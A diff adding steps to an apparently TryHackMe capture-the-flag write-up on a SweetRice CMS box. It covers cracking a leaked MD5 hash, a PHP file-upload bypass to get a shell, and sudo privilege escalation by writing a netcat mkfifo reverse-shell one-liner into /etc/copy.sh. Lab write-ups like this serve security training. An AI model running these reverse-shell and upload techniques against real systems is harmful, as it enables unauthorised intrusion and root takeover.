@@ -104,14 +104,59 @@ by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
 - We can also find a list of files as directory listing is enabled http://10.10.1.0/content/inc/
 - With google research we find in the exploits a reference to the plugin directory http://10.10.1.0/content/_plugin/
 
-## Resources
+### The mysql file
 
-https://www.cvedetails.com/vulnerability-list/vendor_id-8230/product_id-18429/Basic-cms-Sweetrice.html
-https://packetstormsecurity.com/files/83274/SweetRice-0.5.3-Remote-Local-File-Inclusion.html
-https://www.exploit-db.com/exploits/40718
-https://www.exploit-db.com/exploits/40716
-https://packetstormsecurity.com/files/139521/SweetRice-1.5.1-Code-Execution.html
-https://www.cvedetails.com/cve/CVE-2009-4231/
-https://web.archive.org/web/20200229165936/http://www.basic-cms.org/
+- The mysql backup file contains an MD5 hashed password.
+- With a look on [crackstation](https://crackstation.net/) we can get it in cleartext  
+![image](https://user-images.githubusercontent.com/96747355/176510084-9f773c08-6f4b-42c1-b507-a74f09a879b4.png)  
+We can try to login using the username and password found in this file. It works  
+![image](https://user-images.githubusercontent.com/96747355/176510576-3ca38a7e-d018-4740-8ae8-27d042b2fcea.png)  
+- If we go in the media page there is a file upload vulnerability. According to the code of this [exploit](https://www.exploit-db.com/exploits/40716) if we change our file extension to php5 it will get uploaded.  
+- It works, our file is uploaded and then we get our shell  
+![image](https://user-images.githubusercontent.com/96747355/176519186-1790925f-223d-4b9c-8465-ecd077564ac3.png)  
+![image](https://user-images.githubusercontent.com/96747355/176519300-7f6ae53b-67c3-4fe5-8293-3a3e03618257.png)  
+- If we ls to /home we have an `itguy` directory
+- We can even freely go to this user directory we have enough permissions
+- Let's grab the user flag  
+![image](https://user-images.githubusercontent.com/96747355/176520471-3040b87e-e7cb-4d2c-9dcf-a3bbfaf7360a.png)  
+- Let's stabilize our shell `python3 -c 'import pty; pty.spawn("/bin/bash")'`
+- In the home folder we have a file called `mysql_login.txt` with a password in it. We can connect to mysql with the password provided `mysql -u rice -p`
 
+## Privilege Escalation
+
+- Here is what we get if we do `sudo -l`
+```
+sudo -l
+Matching Defaults entries or www-data on THM-Chal:
+    env_reset, mail_badpass,
+    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User www-data may run the following commands on THM-Chal:
+    (ALL) NOPASSWD: /usr/bin/perl /home/itguy/backup.pl
+```
+- Here is the content of `backup.pl`
+
+```bash
+cat backup.pl
+#!/usr/bin/perl
+
+system("sh", "/etc/copy.sh");
+```
+- Here is the content of /etc/copy.sh, it looks like a reverse shell
+```
+cat /etc/copy.sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 192.168.0.190 5554 >/tmp/f
+```
+- Let's replace it with the same thing but with my kali IP instead `echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.22.56 5554 >/tmp/f" > /etc/copy.sh`
+- Our change is successful  
+```
+cat /etc/copy.sh
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.13.22.56 5554 >/tmp/f
+```
+- Let's set our listener to port 5554 `rlwrap nc -lvnp 5554`
+- And now let's launch the perl script we are allowed to launch `sudo /usr/bin/perl /home/itguy/backup.pl`
+- We get a root shell with having to do a lateral movement!  
+![image](https://user-images.githubusercontent.com/96747355/176549169-a2ffd697-f4ca-46b8-a9ef-b2a9a9f54e40.png)  
+- Let's grab our root flag  
+![image](https://user-images.githubusercontent.com/96747355/176549386-a83b5546-b6bb-43a7-b1a8-81088b67b5ac.png)
 
